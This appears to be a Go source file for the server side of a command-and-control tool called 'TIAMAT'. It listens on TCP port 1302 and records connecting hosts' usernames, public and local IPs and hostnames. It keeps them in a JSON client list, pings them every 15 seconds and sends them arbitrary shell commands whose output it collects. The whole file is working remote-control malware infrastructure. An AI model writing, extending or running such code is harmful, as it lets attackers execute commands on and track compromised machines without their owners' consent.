package cmd

import (
	"encoding/gob"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"os"
	"time"

	"github.com/spf13/viper"
)

var (
	C2Port     string = "1302"
	clientList []Client
	clientIDs  int = 0

	heartbeatRate time.Duration = 15

	isUsingJSONParameter bool
	clientJSONPath       string = "/.config/tiamat/clients.json"
)

func (c Client) Instruct(i Instructions) error {
	enc := gob.NewEncoder(c.Conn)
	err := enc.Encode(i)
	if err != nil {
		return err
	}
	return nil
}

func recoverClients() error {
	var fileToOpen string
	home, err := os.UserHomeDir()
	if err != nil {
		return err
	}
	if isUsingJSONParameter == false {
		fileToOpen = home + clientJSONPath
		configPath := viper.GetString("Server.ClientPath")
		if configPath != "" {
			fileToOpen = configPath
		}
	} else {
		fileToOpen = clientJSONPath
	}

	clients := ClientJSON{}
	file, err := os.Open(fileToOpen)
	if err != nil {
		if os.IsNotExist(err) {
			log.Printf("Missing file at %v\n", fileToOpen)
			return nil
		}
		return err
	}
	jsonParse := json.NewDecoder(file)
	if err = jsonParse.Decode(&clients); err != nil {
		return err
	}
	for _, v := range clients.List {
		client := Client{}
		client.ClientBasicInfo = v
		client.IsOnline = false
		client.ClientID = clientIDs
		clientIDs++
		clientList = append(clientList, client)
	}
	return nil
}

func Server() {
	log.SetPrefix("[TIAMAT] ")
	p := viper.GetString("Server.Port")
	if p != "" {
		C2Port = p
	}
	go WebServer()

	if err := recoverClients(); err != nil {
		log.Fatalf("Error happened recovering clients: %v\n", err)
	}

	ln, err := net.Listen("tcp", ":"+C2Port)
	if err != nil {
		log.Fatalf("Error happened listening on C2 port: %v\n", err)
	}
	log.Printf("Listening on port %v...", C2Port)
	defer ln.Close()

	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Printf("Error happened accepting connection: %v\n", err)
		}
		handleConn(conn)
	}
}

func handleConn(conn net.Conn) {
	ID, err := getClient(conn)
	if err != nil {
		log.Printf("Error happened receiving OS information: %v\n", err)
	}

	go Heartbeat(ID)
}

func sendCommand(ID int, command string) (Output string, err error) {
	inst := Instructions{
		IsCommand: true,
		Message:   command,
	}
	clientList[ID].Instruct(inst)
	resp, err := ServerMessageReceiver(clientList[ID].Conn)
	if err != nil || resp.Successful != true {
		e := fmt.Errorf("%v\n", resp.Message)
		return "", e
	}
	return resp.Message, nil
}

func Heartbeat(ID int) {
	for {
		inst := Instructions{
			IsHeartbeat: true,
			Message:     "PING",
		}
		clientList[ID].Instruct(inst)
		resp, err := ServerMessageReceiver(clientList[ID].Conn)
		if err == nil && resp.Message == "PONG" {
			if clientList[ID].IsOnline != true {
				clientList[ID].IsOnline = true
			}
		} else {
			log.Printf("Client %v is offline :(\n", clientList[ID].ClientBasicInfo.Hostname)
			clientList[ID].IsOnline = false
			return
		}

		time.Sleep(time.Second * heartbeatRate)
	}
}

func returnClient(ID int) (Client, error) {
	for _, v := range clientList {
		if v.ClientID == ID {
			return v, nil
		}
	}
	err := fmt.Errorf("Client not found\n")
	return Client{}, err
}

func ServerMessageReceiver(conn net.Conn) (Response, error) {
	dec := gob.NewDecoder(conn)
	c := Response{}
	err := dec.Decode(&c)
	if err != nil {
		return Response{}, err
	}
	return c, nil
}

func getClient(conn net.Conn) (int, error) {
	dec := gob.NewDecoder(conn)
	basicC := ClientBasicInfo{}
	err := dec.Decode(&basicC)
	if err != nil {
		return -1, err
	}

	for i, v := range clientList {
		sameClient := basicC.Username == v.ClientBasicInfo.Username &&
			basicC.PublicIP == v.ClientBasicInfo.PublicIP &&
			basicC.Hostname == v.ClientBasicInfo.Hostname && basicC.LocalIP == v.ClientBasicInfo.LocalIP

		if sameClient == true {
			clientList[i].IsOnline = true
			clientList[i].Conn = conn
			log.Printf("Client %v is back online!\n", clientList[i].ClientBasicInfo.Hostname)
			return i, nil
		}
	}
	newC := Client{}
	newC.ClientBasicInfo = basicC
	newC.Conn = conn
	newC.IsOnline = true
	newC.ClientID = clientIDs
	clientIDs++
	log.Printf("Client %v is online!\n", newC.ClientBasicInfo.Hostname)

	clientList = append(clientList, newC)
	return len(clientList) - 1, nil
}
